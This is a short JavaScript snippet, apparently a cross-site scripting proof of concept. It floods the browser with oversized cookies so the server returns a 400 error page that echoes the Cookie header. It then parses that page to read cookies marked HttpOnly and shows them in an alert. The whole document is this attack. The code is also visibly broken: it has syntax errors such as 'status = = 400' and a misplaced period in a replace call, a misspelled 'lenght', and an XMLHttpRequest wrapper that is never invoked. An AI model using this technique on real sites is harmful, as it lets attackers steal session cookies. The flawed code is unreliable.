// three functions: setcookie(), makerequest(), parsecookie()

function setcookie(good) {

	// create a long cookie > 4KB, and fill it up with filler.

	var filler = "";
	
	for (var i = 0; i < 819; i++) {
		
		filler += "x";
	}

	for (var i = 0; i < 10; i++) {
		
		if (good) {
			cookie = "xss" + i + ";expires=" + new Date().toUTCString() + ";path=/";
		} else {
			cookie = "xss" + i + "=" + filler + ";path=/"; // no need to add ; behind ;path=/
		}

		document.cookie = cookie; //  each loop add a cookie
	}
}

function makerequest () {

	setcookie(); 

	var xhr = function () {
		if (XMLHttpRequest) {
			xhr = new XMLHttpRequest();
		} else {
			xhr = new ActiveXObject();
		}
	}

	xhr.onreadystatechange = parsecookies;
	xhr.open("GET","p37.php",true);
	xhr.send();

}

function parsecookies() {

	if (xhr.readyState == 4 && xhr.status = = 400) {
		var content = xhr.responseText.replace(/\r|\n/g.'').match(/<pre>(.+)<\/pre>/);
		if (content.lenght) {

			content = content[1].replace("Cookie: ","");
			cookies = content.replace(/xss\d=x+;?/g,"").split(/;/g);

			alert(cookies);
		}
	}




}

makerequest();

